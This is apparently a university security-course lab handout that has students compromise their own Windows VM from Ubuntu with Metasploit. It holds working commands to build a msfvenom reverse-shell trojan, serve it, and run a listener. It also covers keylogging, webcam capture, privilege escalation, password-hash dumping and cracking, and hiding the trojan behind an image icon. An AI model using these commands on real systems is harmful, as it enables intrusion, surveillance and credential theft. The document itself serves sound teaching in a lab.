# its250
Online resources and examples

## Lab07: Penetration test

### 1. Description
Install Metasploit framework on Ubuntu then launch it from Ubuntu, carry out a cyber attack on the Windows server VM to get ultimate control.

**Prerequisite**

* Both Windows server VM and the Ubuntu VM are used
* Install Metasploit framework on Ubuntu

You may follow this [installation video](https://youtu.be/qKudXchmnWc) to install Metasploit framework on Ubuntu.

1. Install with [Rapid7 installer](https://docs.rapid7.com/metasploit/installing-the-metasploit-framework) on Ubuntu.
   ```bash
   # 0. Update and upgrade Ubuntu
   sudo apt update -y && sudo apt upgrade -y
   # 1. Disable anti-virus software (default)
   # 2. Disable firewalls (default)
   # 3. Install with root priviledges
   curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall 
   chmod 755 msfinstall
   sudo ./msfinstall
   ```
2. (Optional) Install with [Rapid7 installer](https://docs.rapid7.com/metasploit/installing-the-metasploit-framework) on Windows.
   ```batch
   # 1. Disable anti-virus software (Done in Lab03)
   # 2. Disable firewalls (Done in Lab03)
   # 3. Download metaspoit framework windows installer, then in nstall with Administrator account.
   ```

### 2. Tasks (100%)

*Note: replace VM IPs with yours in these tasks*

1. (5%) Find the IP addresses of your Windows server VM and Ubuntu VM, make sure they can ping each other
2.  (5%) On Ubuntu, create a trojan program with msfvenom
    ```bash
    # Replace the Ubuntu_IP with yours
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=Ubuntu_IP LPORT=12345 -f exe > trojan.exe
    ```
3. (5%) On Ubuntu, host trojon.exe with Python built-in SimpleHTTPServer
   ```bash
   # Run the command below from the folder contains trojan.exe
   sudo python3 -m http.server 80
   ```
4. (10%) On Ubuntu, starting a Command-and-Control (C&C) Server
   ```bash
   # Inside msfconsole, replace the Ubuntu_IP with yours
   use multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST Ubuntu_IP
   set LPORT 12345
   # 1. one-time exploit
   exploit

   # 2. continuous exploit
   set exitonsession false
   exploit -j
   ```
5. (5%) On Windows, open a web browser, download http://Ubuntu_IP/trojan.exe, 
6. (5%) On Windows run trojan.exe and ignore any warnings.
7. (5%) On Ubuntu, if everything works, a meterpreter session should open.
8. (10%) Explore and use the meterpreter shell
9. (10%) Migrate to a different process inside meterpreter
   ```bash
   # show a list of processes
   ps
   # migrate to winlogon process
   migrate -N explorer.exe
   # migration is unreliabe. If it failed, restart Windows VM, repeat step 6-9 until succeed.
   ```
10. (20%, each 4%) Post-exploitation. Now the Windows VM is under control. Play with the following meterpreter commands.
   ```bash
   # 1. take a screenshot of the victim's desktop
   screenshot
   # 2. capture key strokes
   # 2.1 start capturing key stroke in the victim machine
   keyscan_start
   # 2.2 On the victim machine, open notepad and type something
   # 2.3 Inside meterpreter, dump the captured key strokes
   keyscan_dump
   # 3. (Optional) Take a phone with the webcam
   webcam_snap
   # 4. Get a Windows command prompt on the victim machine
   shell
   # exit the windows command prompt above
   exit
   # 5. Check network connections on the victim machine from meterpreter
   netstat
   ```
11. (20%) Cracking and changing Windows password.
    1. (10%) Dump the hash values of all saved passwords of all windows users, then crack with John the Ripper.
    ```bash
    # Inside meterpreter
    # 1. Check the priviledge that meterpreter is currently in
    getuid
    # 2. Escalate priviledge
    use priv
    getsystem
    getuid
    # 3. dump the hashes
    hashdump # save the result in a text file
    # 4. crack the hashes
    john --wordlist=pass_dict.txt --format=NT hashes.txt
    ```
    2. (10%) Change Windows users' password. Use a user found above, replace oldpass and newpass with yours
    ```bash
    # Inside msf
    msf > use post/windows/manage/change_password
    msf post(change_password) > set smbuser user_name
    msf post(change_password) > set old_password oldpass
    msf post(change_password) > set new_password newpass
    msf post(change_password) > set session 1
    msf post(change_password) > exploit
    ```

### 3. Review questions (Optional)
1. Hide trojan.exe in a self-extract archive.
   1. Download an image as a cover image.
   2. With WinRAR, create a self-extract archive of the cover image and trojan.exe
   3. Configure run after extraction to be: trojan.exe then the cover image.
   4. Download another harmless-look image, convert it into an icon on [icoconvert](https://icoconvert.com/), then use this icon as the icon of the self-extract archive.
2. Use Metasploit Framework GUI - Armitage
   1. Install Java JDK
      ```bash
      sudo apt install  default-jdk
      ```
   2. Download [Armitage](http://www.fastandeasyhacking.com) and extract it.
   3. Init Metasploit Framework database and load the MSGRPC Plugin
      ```bash
      msfdb reinit
      msfconsole
      msf > load msgrpc # note down the user name and password used for armitage
      ```
    4. Run Armitage and connect to the msfrpc running above
      ```bash
      export MSF_DATABASE_CONFIG="/home/$USER/.msf4/database.yml"
      ./armitage
      ```
    5. Enjoy Armitage

**Demo video**


## Reference
* [Running a simple HTTP web server with one terminal command and python](https://linuxconfig.org/running-a-simple-http-web-server-with-one-terminal-command-and-python)
  * [Share Files Using Lightweight Http Servers in Linux](https://linuxhint.com/share_files_lightweight_http_server/)
* [Metasploit](https://docs.rapid7.com/metasploit/quick-start-guide)
  * [Installing Metasploit](https://docs.rapid7.com/metasploit/installing-metasploit-pro)
  * [Restarting Metasploit Services](https://docs.rapid7.com/metasploit/restarting-metasploit-services)
  * [Uninstalling Metasploit](https://docs.rapid7.com/metasploit/uninstalling-metasploit)
* [Installing Metasploit Penetration Testing Framework](https://fedoraproject.org/wiki/Metasploit_Penetration_Testing_Framework)
  * [Metasploit Postgres Setup](https://fedoraproject.org/wiki/Metasploit_Postgres_Setup)
* [Metasploit Framework](https://docs.rapid7.com/metasploit/msf-overview)
* [Creating Infectious Media with Metasploit](https://samsclass.info/123/proj10/p4msf.htm)
* [Offensive Msfvenom: From Generating Shellcode to Creating Trojans](https://medium.com/@PenTest_duck/offensive-msfvenom-from-generating-shellcode-to-creating-trojans-4be10179bb86)
  * [Hide Payloads Behind Images](https://medium.com/@chamo.wijetunga/hide-payloads-behind-images-and-hacking-windows-fb82cf2f0e7c)
    * [7z examples](https://www.dotnetperls.com/7-zip-examples)
  * [Create malicious PDF](https://fareedfauzi.github.io/blog-post/Create-malicious-pdf/)
  * [How to Embed (Hide) a Backdoor into a File (pdf, exe, etc...)](http://dan3lmi.blogspot.com/2019/01/how-to-embed-hide-backdoor-into-file.html)
* [Lab: Hacking an Android Device with MSFvenom](https://resources.infosecinstitute.com/topic/lab-hacking-an-android-device-with-msfvenom/)
* [Autorun.inf Maker](http://www.ashzfall.com/products/autorun/index.html)
  * [How do I test autorun.inf files without wasting CD's?](http://www.ashzfall.com/products/autorun/autorunfloppy.html)
  * [How to Auto-Run Windows Programs When You Plug In a USB Drive](https://www.howtogeek.com/326049/how-to-auto-run-windows-programs-when-you-plug-in-a-usb-drive/)
* [meterpreter basics](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)
  * [Quick Meterpreter and Metasploit tutorial - Stealing hashes and passwords, Keyloggers, Webcams and other post-exploitation modules](http://www.ethicalpentest.com/2018/03/meterpreter-metasploit-tutorial-part2.html)
  * [Post Exploitation for Remote Windows Password](https://www.hackingarticles.in/post-exploitation-remote-windows-password/)
  * [Dumping Domain Password Hashes](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
  * [Cracking Windows Password Hashes with Hashcat](https://samsclass.info/123/proj14/123p12winhash.htm)
  * [Meterpreter basics practice](https://www.utc.edu/center-academic-excellence-cyber-defense/pdfs/4660-lab6.pdf)
  * [Armitage](http://www.fastandeasyhacking.com)
    * [source](https://github.com/rsmudge/armitage)